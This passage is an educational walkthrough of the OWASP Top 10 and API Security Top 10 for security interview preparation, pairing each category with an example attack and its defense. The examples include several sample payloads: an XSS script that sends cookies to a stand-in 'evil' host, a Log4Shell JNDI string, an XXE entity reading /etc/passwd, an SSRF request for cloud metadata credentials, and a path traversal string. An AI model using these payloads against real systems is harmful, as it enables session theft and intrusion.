# OWASP Top 10 & API Security Top 10 Walkthrough

The **OWASP Top 10** is a periodically updated *awareness document* that ranks the ten
most critical **web application** security risk categories. It is not a checklist or a
standard — it is a starting point that says "if you fix nothing else, fix these classes
of problem." The current edition is **OWASP Top 10 2021** (the 2017 edition preceded it;
a 2025 edition is in progress at time of writing). This topic walks each 2021 category
with a **concrete example + defense**, explains **how the list is built** and **what
moved/merged** since 2017, and then *references* the separate **OWASP API Security Top 10
2023** without duplicating it (the `rest-api-design` topic owns the API list in depth).

> [!KEY-TAKEAWAY]
> The Top 10 is organized around **root-cause CWE groupings**, not individual bugs. Each
> "category" (e.g. A01 Broken Access Control) is a *bucket* of mapped CWEs. Interviewers
> want you to name the category, give a concrete attack, and give the *primary* defense —
> not recite all ten from memory in order.

> [!INTERVIEW]
> The highest-signal facts to have ready: **A01 Broken Access Control is now #1** (up from
> #5) and is the most prevalent category; **A03 Injection now includes XSS**; **A04
> Insecure Design and A10 SSRF are new in 2021** (SSRF was community/survey-voted); the
> old **Insecure Deserialization folded into A08 Software & Data Integrity Failures**; and
> **XXE folded into A05 Security Misconfiguration**. Know the *primary* defense per item.

The mnemonic list (2021):

| ID | Category | vs 2017 |
|---|---|---|
| A01 | Broken Access Control | ↑ from #5 (now #1) |
| A02 | Cryptographic Failures | renamed from "Sensitive Data Exposure" (#3), root-cause framing |
| A03 | Injection | ↓ from #1; **XSS merged in** |
| A04 | Insecure Design | **NEW** |
| A05 | Security Misconfiguration | ↑ from #6; **XXE merged in** |
| A06 | Vulnerable & Outdated Components | ↑ from #9 ("Using Components with Known Vulnerabilities") |
| A07 | Identification & Authentication Failures | renamed from "Broken Authentication" (#2), moved down |
| A08 | Software & Data Integrity Failures | **NEW**; **Insecure Deserialization** (2017 #8) merged in |
| A09 | Security Logging & Monitoring Failures | ↑ from #10 |
| A10 | Server-Side Request Forgery (SSRF) | **NEW** (community survey) |

---

## How the Top 10 is built and what changed since 2017

The list is assembled from **two inputs**, and this two-input methodology is a favorite
interview probe:

1. **Contributed data (8 of 10 categories).** Organizations submit vulnerability data
   across a large corpus of applications (the 2021 edition drew on data covering
   ~500,000 applications and testing against **~400 CWEs**, grouped into categories). For
   each CWE, OWASP computes the **incidence rate** — the percentage of *applications* with
   at least one instance of that CWE — rather than raw frequency of findings. This
   deliberately reduces bias from automated tools that report huge counts of a single
   easy-to-find bug.
2. **Industry survey (2 of 10 categories).** Two slots are chosen by a community survey of
   practitioners, to capture risks that are **hard to test for automatically** and so are
   under-represented in tool data but well-known to be dangerous. In 2021 these were
   **A04 Insecure Design** and **A10 SSRF**.

Each category is scored on eight factors: the eight data factors (incidence,
weighted exploitability, weighted impact, coverage, etc.) plus the survey. OWASP
publishes, per category, average **weighted exploitability** and **weighted (technical)
impact** derived from the CVSS-style scores attached to mapped CWEs, plus max/avg
incidence rates.

**What moved/merged 2017 → 2021 (the story to tell):**

- **Broken Access Control** jumped from #5 to **#1** — 94% of tested apps were *tested for*
  some form of it (average incidence rate ~3.81%), and it had the most CWE occurrences
  (34 mapped CWEs) of any category. Note the exact wording: it is not that 94% *had* the
  flaw. Authorization is hard and broadly broken.
- **Sensitive Data Exposure → Cryptographic Failures (A02).** Renamed to describe the
  *root cause* (crypto done wrong or not at all) rather than the *symptom* (data leaked).
- **Injection dropped to #3 and absorbed XSS.** XSS is injection into an HTML/JS
  interpreter, so it now lives inside A03.
- **XXE (XML External Entities, 2017 #4) merged into A05** Security Misconfiguration
  (it is fundamentally a misconfigured/default-enabled XML parser feature).
- **Insecure Deserialization (2017 #8) merged into A08** Software & Data Integrity
  Failures, broadening the theme to CI/CD and supply-chain integrity.
- **A04 Insecure Design and A10 SSRF are new**, reflecting a shift toward "shift-left"
  secure design and the rise of SSRF in cloud/metadata-endpoint environments.

> [!TIP]
> When asked "is the Top 10 a compliance standard?" the correct answer is **no** — it is
> an awareness document. For a *verifiable requirements standard* point to **OWASP ASVS**
> (Application Security Verification Standard); for testing methodology point to the
> **WSTG** (Web Security Testing Guide).

---

## A01:2021 – Broken Access Control

**Definition.** Access control (authorization) enforces *what an authenticated principal
is allowed to do*. It is **broken** when the server fails to enforce those limits, letting
a user act outside their intended permissions — reading/modifying other users' data,
escalating to admin, or invoking functions they shouldn't.

**Why #1.** 94% of tested applications were *assessed for* some form of broken access
control (average incidence rate ~3.81%), and it had the most CWE occurrences (34 mapped
CWEs) of any category — not, as the statistic is often misquoted, that 94% *had* the flaw.
Authorization is application-specific, hard to test automatically, and easy to forget on
even one endpoint.

**Concrete example — IDOR / BOLA (object-level).** The classic *Insecure Direct Object
Reference*, called **BOLA (Broken Object Level Authorization)** in the API world:

```
GET /api/invoices/1001    Authorization: Bearer <alice's token>   → 200 (Alice's invoice)
GET /api/invoices/1002    Authorization: Bearer <alice's token>   → 200 (BOB's invoice!)
```

The server looks up the object by the ID in the URL but never checks that the object
*belongs to the caller*. Incrementing the ID walks through everyone's data.

**Other forms:** privilege escalation (regular user reaches `POST /admin/*`), **forced
browsing** to unlinked pages, **metadata/JWT tampering** (changing `role: user` to
`role: admin`), **missing function-level access control**, CORS misconfiguration exposing
APIs, and *elevation by verb* (an endpoint allows `PUT`/`DELETE` from users who should
only `GET`).

**Primary defense.**
- **Deny by default** — everything is forbidden unless explicitly granted.
- Enforce authorization **server-side**, on **every request**, based on the
  **authenticated session/token identity — never on a client-supplied ID or role field**.
  For every object access, check "does *this principal* own / have permission on *this
  object*?" (ownership check), not just "is the object ID valid?".
- Centralize the access-control mechanism and reuse it; don't reimplement per handler.
- Use **unguessable references where feasible** (but note: random IDs are *defense in
  depth*, not a substitute for the ownership check — an ID that leaks still needs a check).
- Rate-limit and log access-control failures; invalidate sessions/tokens server-side on
  logout.

> [!WARNING]
> Replacing sequential IDs with UUIDs does **not** fix IDOR — it only makes enumeration
> harder. The real fix is the per-request **ownership/permission check**. Interviewers
> often plant "we switched to UUIDs" as a wrong answer.

---

## A02:2021 – Cryptographic Failures

**Definition.** Renamed from "Sensitive Data Exposure," A02 covers failures related to
**cryptography (or its absence)** that lead to exposure of sensitive data (PII,
credentials, health/financial data) or auth bypass. The rename shifts focus from the
*symptom* (exposed data) to the *root cause* (bad or missing crypto).

**Concrete examples.**
- **Data in transit unencrypted or downgradable** — plaintext HTTP, or TLS present but no
  `Strict-Transport-Security` (HSTS), allowing SSL-strip downgrade.
- **Data at rest unencrypted**, or encrypted with hard-coded/weak keys.
- **Weak algorithms:** using **MD5 or SHA-1** (both broken for collision resistance;
  MD5 collisions are trivial, SHA-1 broken by SHAttered 2017), **DES/3DES**, RC4, or
  **ECB mode** (identical plaintext blocks → identical ciphertext blocks; the "ECB
  penguin" leaks structure).
- **Fast hashes for passwords** — SHA-256 of a password is a cryptographic failure;
  passwords need a **slow, salted KDF** (bcrypt / scrypt / **Argon2id** / PBKDF2).
- **Unauthenticated encryption** — CBC without a MAC enables padding-oracle attacks; use
  **AEAD (AES-GCM / ChaCha20-Poly1305)**.
- **Predictable IVs/nonces / reusing a nonce** with a stream/GCM mode (catastrophic — key
  recovery for GCM auth).

**Primary defense.**
- Classify data; **don't store what you don't need**.
- **Encrypt in transit (TLS 1.2+/1.3) with HSTS**, and encrypt sensitive data at rest.
- Use **strong, current primitives**: AES-256-GCM or ChaCha20-Poly1305 (AEAD), SHA-256/
  SHA-3 for integrity hashing, Argon2id/bcrypt/scrypt/PBKDF2 for passwords, and proper
  key management (rotation, KMS/HSM, no keys in source). See `cryptography-foundations`
  and `password-storage-and-credential-security` for the primitives.
- Ensure randomness comes from a **CSPRNG**, never `rand()`/`Math.random()`.

> [!KEY-TAKEAWAY]
> "Cryptographic failure" ≠ "the algorithm was broken." Far more often it is **using the
> right tool wrong**: no encryption at all, encryption without authentication, a fast hash
> for passwords, reused nonces, or a key checked into git.

---

## A03:2021 – Injection

**Definition.** Injection occurs when untrusted input is sent to an **interpreter** (SQL,
NoSQL, OS shell, LDAP, XPath, or an **HTML/JS interpreter** for XSS) such that the input
breaks out of its data context and is executed as code/structure. **In 2021, XSS was
merged into A03** because it is injection into the browser's HTML/JS interpreter.

**Concrete example — SQL injection.**
```sql
-- vulnerable: string concatenation
"SELECT * FROM users WHERE name = '" + input + "'"
-- input:  ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1'   -- returns all rows
```
**XSS example (reflected):** `https://site/search?q=<script>document.location='https://evil/?c='+document.cookie</script>`
— if the app echoes `q` into the page unescaped, the script runs in the victim's origin
and steals their session cookie.

**Primary defense.**
- **Parameterized queries / prepared statements** (bind variables) for SQL — the query
  *structure* and *data* travel on separate channels so data is never reparsed as code.
  This is the primary fix; input validation and escaping are *defense in depth*.
- For OS commands, avoid the shell — pass an **argument array** to `exec` (no shell
  interpolation).
- For XSS, apply **context-aware output encoding** (HTML body vs attribute vs JS vs URL),
  use safe templating/auto-escaping, and add a strong **Content-Security-Policy** as
  defense in depth. (Full XSS/CSP detail lives in `xss-csp-and-security-headers`;
  server-side injection detail in `injection-attacks`.)
- Use **allowlist input validation** for structure you can't parameterize (e.g. sort
  column names, table identifiers).

---

## A04:2021 – Insecure Design

**Definition.** A **new 2021 category** covering flaws in the *design* of the system —
missing or ineffective security controls — as distinct from **implementation** defects.
"Insecure design" is a bug that no amount of perfect coding can fix, because the control
was never designed in. A05 (misconfiguration) is *"we built it right but set it up
wrong"*; A04 is *"we never designed the control at all."*

**Concrete examples.**
- A "recover password via security question" flow whose questions have publicly
  discoverable answers — the *design* is weak regardless of code quality.
- An e-commerce checkout with **no anti-automation** on buying limited-stock items,
  enabling scalper bots to drain inventory (a *business-logic* abuse).
- A cinema-booking system that lets you hold seats indefinitely with no limit, enabling
  denial of service by reservation.
- No segregation of tenants in a multi-tenant design.

**Primary defense.**
- **Threat modeling** early and continuously (STRIDE, attack trees) — ask "what can go
  wrong?" per feature during design. (See `security-fundamentals-and-threat-modeling`.)
- Establish and use a **secure development lifecycle (SDLC)** and a library of **secure
  design patterns / paved-road components**.
- Write **abuse cases / misuse cases** alongside user stories; define security
  requirements as first-class acceptance criteria.
- Enforce **business-logic limits** (max quantity, tenant isolation, rate/velocity
  controls) at the design level, and use **defense in depth**.

> [!INTERVIEW]
> The distinction interviewers want: **Insecure Design (A04) = missing/flawed control by
> design; Security Misconfiguration (A05) = a control exists but is set up wrong.** You
> can't "patch" an insecure design — you have to redesign. Threat modeling is the headline
> defense.

---

## A05:2021 – Security Misconfiguration

**Definition.** The application, framework, server, database, or cloud service is
deployed with **insecure settings** — defaults left on, unnecessary features enabled,
verbose errors, or missing hardening. **XXE (XML External Entities) merged into A05 in
2021** because it stems from a misconfigured/default-enabled XML parser.

**Concrete examples.**
- **Default credentials** (`admin/admin`), sample apps, or admin consoles left enabled.
- **Directory listing** on, **stack traces** returned to users (leaking versions/paths).
- **Missing security headers** (no HSTS, no CSP, no `X-Content-Type-Options: nosniff`).
- **Overly permissive CORS** (`Access-Control-Allow-Origin: *` with credentials).
- **Cloud storage misconfig** — a public S3 bucket exposing data.
- **XXE:** an XML parser that resolves external entities:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <foo>&xxe;</foo>          <!-- parser reads /etc/passwd; can also SSRF -->
  ```

**Primary defense.**
- **Harden by default**: remove/disable unused features, sample apps, default accounts;
  minimal install.
- A **repeatable, automated hardening process** (infrastructure-as-code, hardened base
  images) so every environment is configured identically.
- Return **generic error messages**; log details server-side only.
- Send appropriate **security headers**; lock down CORS to explicit origins.
- **Disable DTD/external entity processing** in XML parsers to kill XXE (the primary XXE
  fix), or use less complex formats (JSON) where possible.
- Continuously **scan configurations** and verify in a review step.

---

## A06:2021 – Vulnerable and Outdated Components

**Definition.** Using components (libraries, frameworks, runtimes, OS packages,
containers) with **known vulnerabilities** or that are **unsupported/out of date**.
Renamed from 2017's "Using Components with Known Vulnerabilities." You inherit the
security posture of everything in your dependency tree, including **transitive** deps.

**Concrete examples.**
- **Log4Shell (CVE-2021-44228)** — a JNDI-lookup RCE in Log4j 2 triggered by logging an
  attacker-controlled string like `${jndi:ldap://evil/a}`; affected countless apps
  transitively.
- **Equifax (2017)** — an unpatched **Apache Struts** RCE (CVE-2017-5638) led to breach of
  ~147M records.
- Running an **end-of-life** framework/runtime that no longer receives security patches.

**Primary defense.**
- Maintain an **inventory / SBOM** (Software Bill of Materials) of all components and
  versions, including transitive dependencies.
- Use **Software Composition Analysis (SCA)** tools (e.g. dependency scanners) wired into
  CI to flag known-vulnerable versions against CVE/advisory feeds.
- **Patch promptly**; remove unused dependencies; obtain components only from official
  sources over secure links; prefer maintained, signed releases.
- Have a documented **patch-management process** and monitor advisories.

> [!TIP]
> This category is largely **not found by testing your own code** — it needs SCA and
> inventory. That's why "we do pen-testing" is not a sufficient answer for A06.

---

## A07:2021 – Identification and Authentication Failures

**Definition.** Renamed from "Broken Authentication" and moved down from #2 to #7 (partly
because standard frameworks now do auth better). Covers weaknesses in **confirming user
identity, authentication, and session management** — enabling credential attacks or
session takeover.

**Concrete examples.**
- **Credential stuffing / brute force** with no rate limiting or lockout — attackers
  replay breached username/password pairs.
- **Permitting weak or breached passwords** (e.g. `Password1`).
- **Weak credential recovery** ("knowledge-based" questions).
- **Session fixation** and **not rotating the session ID after login**.
- **Exposing session IDs in the URL**, or **not invalidating sessions/JWTs** on logout
  or timeout.
- **Missing or weak MFA.**

**Primary defense.**
- Implement **MFA** where possible (phishing-resistant WebAuthn/FIDO2 is strongest).
- Follow **NIST SP 800-63B**: check passwords against **breached-password lists**, allow
  long passphrases, **no forced periodic rotation or composition rules**, no password
  hints.
- **Rate-limit / throttle / lock** failed logins; alert on credential-stuffing patterns.
- **Generate new, high-entropy session IDs server-side after login** (kills fixation);
  store them in `Secure; HttpOnly; SameSite` cookies; expire and invalidate on logout.
- Use **generic error messages** ("invalid username or password") to prevent user
  enumeration. (Deep detail in `authentication-and-mfa` and
  `session-management-and-secure-cookies`.)

---

## A08:2021 – Software and Data Integrity Failures

**Definition.** A **new 2021 category** about code and infrastructure that fails to
protect against **integrity violations** — trusting data, updates, plugins, or CI/CD
pipelines without verifying they haven't been tampered with. **2017's Insecure
Deserialization is subsumed here.**

**Concrete examples.**
- **Insecure deserialization:** an app deserializes an attacker-controlled serialized
  object (Java `ObjectInputStream`, Python `pickle`, .NET `BinaryFormatter`, PHP
  `unserialize`) that triggers a "gadget chain," leading to **remote code execution**.
- **Unsigned/unverified auto-update:** an application downloads and runs updates without
  **verifying a digital signature** — attacker serves a malicious update.
- **CI/CD pipeline compromise / supply-chain attack:** the **SolarWinds** attack (2020)
  inserted the SUNBURST backdoor into the Orion build pipeline, so signed, "trusted"
  updates carried malware to ~18,000 customers. Also: pulling dependencies from untrusted
  registries, or a compromised build server injecting code.

**Primary defense.**
- **Never deserialize untrusted data** into complex objects; prefer data-only formats
  (JSON) with strict schemas; if unavoidable, use allowlists of expected types and
  integrity checks.
- **Digital signatures** to verify software/updates and critical data come from the
  expected source (verify before executing).
- Harden the **CI/CD pipeline**: least privilege, code review, integrity checks on the
  build, signed artifacts, and **verify dependencies** (checksums/signatures, lockfiles);
  ensure unsigned/unverified code can't be deployed.

> [!WARNING]
> Insecure deserialization is not "just A03." In 2021 it is part of **A08**. And the
> fix isn't "sanitize the serialized blob" — it's **don't deserialize untrusted input**
> (or verify integrity/signature first).

---

## A09:2021 – Security Logging and Monitoring Failures

**Definition.** Moved up from #10. Insufficient logging, monitoring, alerting, or incident
response means breaches go **undetected**. This category is about **detection and
response**, not prevention — but without it, attackers dwell for months.

**Concrete examples.**
- **Auditable events not logged** — logins, failed logins, high-value transactions,
  access-control failures produce no record.
- Logs stored **only locally**, easily wiped by the attacker, with **no alerting** on
  suspicious patterns (e.g. thousands of failed logins = credential stuffing goes
  unnoticed).
- Verified breaches historically took **~200+ days to detect** (industry dwell-time data),
  usually by an external party, not the victim.
- **Log injection / forging:** unescaped newlines in logged input let an attacker inject
  fake log lines (CRLF), or logging sensitive data (passwords, tokens) *into* the logs
  (which is itself a leak).

**Primary defense.**
- **Log security-relevant events** (auth successes/failures, access-control failures,
  input-validation failures, high-value actions) with enough context and a consistent
  format, and **ship them off-box** to a central, tamper-resistant store (SIEM).
- **Alert and monitor** in near real-time; define thresholds (e.g. N failed logins).
- Have an **incident response / recovery plan** (align with NIST 800-61).
- **Never log secrets/PII**; **sanitize/encode** logged input to prevent log injection.

> [!KEY-TAKEAWAY]
> A09 is the "you can't respond to what you can't see" category. Note the tension: log
> *enough* to detect and investigate, but **never log credentials, tokens, or PII**, and
> encode untrusted values to prevent log forging.

---

## A10:2021 – Server-Side Request Forgery (SSRF)

**Definition.** A **new 2021 category, added via the community survey.** SSRF occurs when
an application **fetches a URL supplied (or influenced) by the user** without validating
the destination, letting an attacker make the *server* send requests to targets the
attacker couldn't reach directly — internal services, cloud metadata endpoints, or
localhost admin ports.

**Concrete example — cloud metadata theft.** An app has a "fetch image from URL" feature:
```
POST /fetch  { "url": "https://example.com/logo.png" }
```
Attacker changes the URL to the **cloud metadata endpoint**:
```
POST /fetch  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role" }
```
On IMDSv1 the server dutifully fetches it and returns **temporary IAM credentials** —
enabling full cloud account compromise (this class of attack drove the Capital One 2019
breach). SSRF also enables **internal port scanning**, hitting `http://localhost:8080/admin`,
and reading internal-only APIs.

**Primary defense.**
- **Allowlist** the schemes, hosts, and ports the server may fetch (deny by default);
  reject non-`http(s)`, redirects to disallowed hosts, and non-allowlisted destinations.
- **Block access to internal ranges and the metadata IP** (`169.254.169.254`, RFC 1918,
  loopback, link-local) at both the app and the network layer.
- **Do not send raw responses** back to the client; disable HTTP redirect following or
  re-validate after each redirect.
- Enforce network **egress segmentation** so the app server simply can't reach internal
  services; on AWS, **require IMDSv2** (session-token, hop-limit) to blunt metadata SSRF.
- Beware **DNS rebinding / TOCTOU** — validate the *resolved IP at connection time*, not
  just the hostname. (Deep detail in `ssrf-and-server-side-request-attacks`.)

---

## Referencing the API Security Top 10 (2023)

Because web APIs have a **different threat profile** than server-rendered web apps, OWASP
maintains a **separate list: the API Security Top 10** (current edition **2023**). This
walkthrough only **references** it — the `rest-api-design` topic owns the API list in
detail. What to know here:

- It is a **distinct, complementary** list, not a subset of the web Top 10.
- Its **#1 is API1:2023 Broken Object Level Authorization (BOLA)** — the same IDOR/
  object-ownership failure that dominates web **A01**, and consistently the top API risk.
- Authorization dominates: it also has **Broken Function Level Authorization** and (new in
  2023) **Broken Object Property Level Authorization** (which merged 2019's *Excessive Data
  Exposure* and *Mass Assignment*).
- Notable API-specific entries not called out separately in the web list: **Unrestricted
  Resource Consumption**, **Unrestricted Access to Sensitive Business Flows** (new 2023),
  **Improper Inventory Management** (shadow/zombie APIs), and **Unsafe Consumption of
  APIs** (trusting third-party APIs too much). **SSRF** appears on both lists.

> [!TIP]
> If asked "web Top 10 vs API Top 10," say: same *spirit* (root-cause categories from data
> + survey) but the API list emphasizes **object-/function-/property-level authorization,
> resource consumption, and inventory**, because APIs expose many fine-grained endpoints
> and object IDs directly to clients. Both put an authorization failure at #1.

---

## The 2025 edition — what changed from 2021

> [!KEY-TAKEAWAY]
> **OWASP Top 10:2025 is now released** (owasp.org/Top10/2025/) and materially reorders,
> renames, and merges the list. The *topic slug stays* `owasp-top-10-walkthrough`, and 2021
> remains the edition most production programs still cite — but a 2025-era senior interview
> expects you to know the new list, the moves, and *why* they moved.

**The 2025 list (order):**

| ID | 2025 Category | vs 2021 |
|---|---|---|
| A01 | Broken Access Control | still #1; **SSRF merged in** (dashed-line mapping) |
| A02 | Security Misconfiguration | ↑ from #5 |
| A03 | **Software Supply Chain Failures** | **expanded** from A06 "Vulnerable & Outdated Components"; community-survey #1 concern |
| A04 | Cryptographic Failures | ↓ from #2 |
| A05 | Injection | ↓ from #3 |
| A06 | Insecure Design | ↓ from #4 |
| A07 | Authentication Failures | renamed (drops "Identification and") from A07:2021 |
| A08 | Software **or** Data Integrity Failures | "and" → "or" |
| A09 | Security Logging **and Alerting** Failures | "Monitoring" → "Alerting" |
| A10 | **Mishandling of Exceptional Conditions** | **NEW** |

**The moves that make good interview questions:**

- **SSRF is no longer its own category.** A10:2021 SSRF was **merged up into A01 Broken
  Access Control** (shown as a dashed-line mapping in the official change table). This is a
  classic trap: many candidates memorized "SSRF = A10," which is now wrong. SSRF is still a
  real, tested class — it just lives under Broken Access Control conceptually (the server is
  induced to access resources it shouldn't).
- **Software Supply Chain Failures (A03:2025)** expanded A06:2021 "Vulnerable and Outdated
  Components" from *just dependencies* to the whole chain: direct **and transitive**
  dependencies, **build systems** (CI/CD, IDEs and IDE extensions, image/artifact
  repositories), and **distribution** (package registries, SaaS integrations). It also adds
  **separation-of-duty** concerns ("no single person writes code and promotes it to prod
  without oversight"). It was the **#1 community-survey concern** in 2025 — a data-informed
  list still elevated it because incidents (SolarWinds, Log4Shell, xz-utils, npm worms)
  outpace what test data captures.
- **A10:2025 Mishandling of Exceptional Conditions is brand new** (see its own section).
- **Authentication Failures (A07)** dropped "Identification and"; **Logging** became
  **Logging and Alerting** (emphasizing *detection*, not just recording).

**2025 methodology numbers (pair these with the 2021 numbers above):**

- **~2.8 million applications** contributed (vs ~500k in 2021).
- **589 CWEs analyzed** (vs ~400 in 2021).
- **248 CWEs mapped across the final ten categories** (avg ~25 per category, capped at 40).
- **~175k CVE records** mapped (vs ~125k in 2021).
- Still **"8 from data, 2 from community survey"** and **"data-informed, not blindly
  data-driven."** The **2025 survey picks were Software Supply Chain Failures and Security
  Logging & Alerting Failures** (in 2021 they were Insecure Design and SSRF).

> [!INTERVIEW]
> If asked "the 2025 Top 10 just dropped — what changed?": lead with **Supply Chain jumps
> to A03 (survey #1), SSRF merged into A01, new A10 Mishandling of Exceptional Conditions,
> Misconfiguration up to A02.** The *why* is cloud/CI-CD reality plus a run of high-profile
> supply-chain incidents. Then note the numbers grew ~5x (2.8M apps).

---

## A10:2025 – Mishandling of Exceptional Conditions

**Definition.** A **brand-new 2025 category** (24 CWEs) about what happens on the *error /
exception path* — the code that runs when something goes wrong. The headline failure is
**not failing securely**: when a component errors, times out, or hits an unexpected state,
the system should **fail closed** (deny), preserve integrity, and not leak internals.

**Concrete examples.**
- **Failing OPEN instead of closed (CWE-636, "Not Failing Securely").** The classic
  scenario: an authorization/authentication service times out, and the calling code's
  `catch` block **allows the request through** ("fail open") instead of rejecting it. An
  attacker who can induce the timeout bypasses auth.
- **Uncaught exceptions (CWE-248)** that crash a worker or leave a request half-processed.
- **Resource leaks on the exception path** — a connection/file/lock not released when an
  exception unwinds, exhausting the pool and causing **denial of service**.
- **Verbose error messages** (CWE-209) returning stack traces or **raw database errors** to
  the client — powerful reconnaissance for SQL injection (the DB error reveals query
  structure) and version/path disclosure.
- **State/transaction corruption** when a multi-step flow is interrupted with **no
  rollback** — money debited but not credited, or a partial state an attacker can exploit
  (a TOCTOU/race angle).

**Primary defense.**
- **Fail closed / fail secure by default:** on any error in a security decision, deny.
  Design the error path deliberately, not as an afterthought.
- **Catch and handle exceptions explicitly**; never let control-flow decisions depend on an
  exception silently being swallowed.
- **Release resources deterministically** on every path (try-with-resources / finally /
  RAII / context managers) so the exception path can't leak connections or locks.
- **Return generic errors to clients**; log details server-side only (ties to A02 and A09).
- Make multi-step operations **atomic / transactional** so an interruption rolls back
  cleanly rather than leaving corrupt partial state.

> [!WARNING]
> "Fail open vs fail closed" is a favorite scenario: *"your auth service times out — what
> should the gateway do?"* The secure answer is **fail closed (deny)**. Availability
> pressure ("don't lock users out") is exactly what pushes teams to the insecure fail-open
> choice — call that trade-off out explicitly.

---

## CWE vs CVE vs CVSS, and prioritizing patches (KEV, EPSS)

Senior interviews probe the vocabulary the whole list is built on. Keep these distinct:

- **CWE (Common Weakness Enumeration)** — a *class* of weakness / bug type (e.g. CWE-89 SQL
  injection, CWE-79 XSS, CWE-22 path traversal). The Top 10 categories are **groupings of
  CWEs**. A CWE is the *kind* of flaw, not a specific occurrence.
- **CVE (Common Vulnerabilities and Exposures)** — a specific *instance* of a vulnerability
  in a specific product/version (e.g. **CVE-2021-44228** = Log4Shell in Log4j 2). A CVE is
  usually *categorized by* one or more CWEs.
- **CVSS (Common Vulnerability Scoring System)** — a *severity score* (0–10) for a CVE.
  Current versions are **v3.1** and **v4.0**. CVSS Base is intrinsic severity; it says
  nothing about whether the bug is *actually being exploited*.
- **CISA KEV (Known Exploited Vulnerabilities catalog)** — an authoritative list of CVEs
  **observed being exploited in the wild.** A CVE appearing in KEV is a strong "patch now"
  signal regardless of its CVSS number.
- **EPSS (Exploit Prediction Scoring System, FIRST.org)** — a *probability* (0–1) that a CVE
  will be exploited in the next 30 days. Complements CVSS: high CVSS + low EPSS may be less
  urgent than a moderate CVSS with high EPSS.

> [!TIP]
> Prioritization answer: **don't patch by CVSS alone.** Combine **KEV (is it being
> exploited?)** + **EPSS (how likely soon?)** + **CVSS (how bad if it is?)** + **your own
> reachability/exposure** (is the vulnerable code path even reachable, is the asset
> internet-facing?). "Patch promptly" is too vague for senior level.

---

## The OWASP framework family — Top 10 vs ASVS, WSTG, MASVS, SAMM, Proactive Controls

The Top 10 is *awareness*. Senior candidates should place it among OWASP's other projects
and say *when to reach for each*:

- **Top 10 — awareness.** "What are the big risk classes?" Not certifiable, not a checklist.
- **ASVS (Application Security Verification Standard) — verifiable requirements.** A list of
  testable security requirements at three levels:
  - **L1** — opportunistic; achievable with automated tooling + some manual effort; a
    baseline for all apps.
  - **L2** — standard; for most apps that handle sensitive data; the recommended target.
  - **L3** — advanced; for high-value / critical apps (finance, health, life-safety);
    requires the most rigor and manual verification.
- **WSTG (Web Security Testing Guide) — *how to test*** for the issues.
- **MASVS / MASTG — mobile** equivalents (verification standard + testing guide).
- **SAMM (Software Assurance Maturity Model) — program maturity.** How to *run* an appsec
  program across governance, design, implementation, verification, operations. (BSIMM is a
  similar, data-derived maturity model.)
- **Proactive Controls (2024) — the "positive" counterpart** to the Top 10: the top
  defensive techniques to build in, framed as things to *do* rather than risks to avoid.

> [!INTERVIEW]
> One-liner to memorize: **Top 10 = awareness, ASVS = verifiable requirement, WSTG = how to
> test, MASVS = mobile, SAMM/BSIMM = program maturity, Proactive Controls = defenses to
> build in.** "Certify against the Top 10" is a red flag — you verify against **ASVS**.

---

## Access-control models and deeper A01 attacks (RBAC/ABAC/ReBAC, path traversal, mass assignment)

The A01 section above gives the ownership-check fundamentals. Deeper senior material:

**Authorization models (name a mechanism, don't just say "centralize"):**
- **RBAC (Role-Based)** — permissions attached to roles, users assigned roles. Simple;
  struggles with per-object ("can Alice edit *this* doc?") decisions.
- **ABAC (Attribute-Based)** — decisions from attributes of subject/resource/action/
  environment (department, clearance, time, resource owner). Flexible, expressive.
- **ReBAC (Relationship-Based)** — permission derived from a *graph of relationships*
  ("Alice is an editor of a folder that contains this doc"). Google **Zanzibar** is the
  canonical design; used for fine-grained, object-level authorization at scale.
- **PBAC / policy-as-code** — externalize decisions to a policy engine: **OPA/Rego**, AWS
  **Cedar**, or a Zanzibar-style service. Centralizes the `can(subject, action, resource)`
  decision so it isn't reimplemented per handler.

**Vertical vs horizontal escalation (name the axes):**
- **Vertical privilege escalation** — gaining *higher* privileges (user → admin).
- **Horizontal privilege escalation** — accessing *peer* resources at the same level
  (Alice reading Bob's invoice = the IDOR/BOLA case).

**Other A01 members worth naming:**
- **Path / directory traversal (CWE-22)** — `../../etc/passwd` in a filename/path parameter
  escapes the intended directory. Defend with canonicalization + allowlisting, not blocklists.
- **Mass assignment / auto-binding (write-side IDOR)** — a request body sets a field the
  client shouldn't control (`{"isAdmin": true}` or `{"ownerId": <someone else>}`) and the
  framework binds it straight onto the model. Defend by binding only explicitly-allowed
  fields (DTO/allowlist), never the whole object.
- **CSRF** — historically its own item; in 2021+ CSRF-style issues sit near A01. (Deep
  coverage lives in the CSRF topic; here just know it *belongs to the access-control family*.)
- **JWT/token tampering** — beyond "change `role:admin`": **`alg:none`** (drop the
  signature), **key confusion RS256→HS256** (verify an RS256 token as HS256 using the public
  key as the HMAC secret), and accepting unsigned/expired tokens. (Protocol depth lives in
  the OAuth/JWT topic; here it's an authorization-bypass vector.)

**IDOR at scale (systemic fix):** the durable fix isn't fixing one endpoint — it's a
**centralized authorization layer / policy engine** invoked on *every* object access with a
per-request `can(subject, action, resource)` check. At API scale this is BOLA: authorization
must be **per-object-instance**, not just per-endpoint.

---

## Security headers, CORS, and cloud misconfiguration (A02/A05 deep dive)

The misconfiguration section says "missing security headers" and "overly permissive CORS"
generically. Senior interviews want specifics.

**Security headers by name:**
- **`Strict-Transport-Security`** — e.g. `max-age=31536000; includeSubDomains; preload`.
  Forces HTTPS; `preload` gets the domain baked into browsers' **HSTS preload list**.
- **`Content-Security-Policy`** — controls allowed script/style/frame sources; the strongest
  defense-in-depth against XSS. CSP Level 3 adds **Trusted Types** for DOM-XSS sink control.
- **`X-Content-Type-Options: nosniff`** — stops MIME-sniffing that can turn an upload into
  executable content.
- **`X-Frame-Options` / CSP `frame-ancestors`** — clickjacking defense; `frame-ancestors`
  is the modern replacement.
- **`Referrer-Policy`** — limits how much URL is leaked in the `Referer` header.
- **`Permissions-Policy`** — gates powerful browser features (camera, geolocation, etc.).
- **`X-XSS-Protection`** — the legacy IE/Chrome XSS auditor header, **deprecated**; modern
  guidance is to set it to `0` (or omit) and rely on CSP. Recommending it is a red flag.

**CORS internals (a favorite gotcha):**
- **`Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials:
  true` is forbidden by the Fetch spec** — the browser refuses to expose the response.
  Credentialed requests require an **explicit, exact origin** to be echoed (and even then,
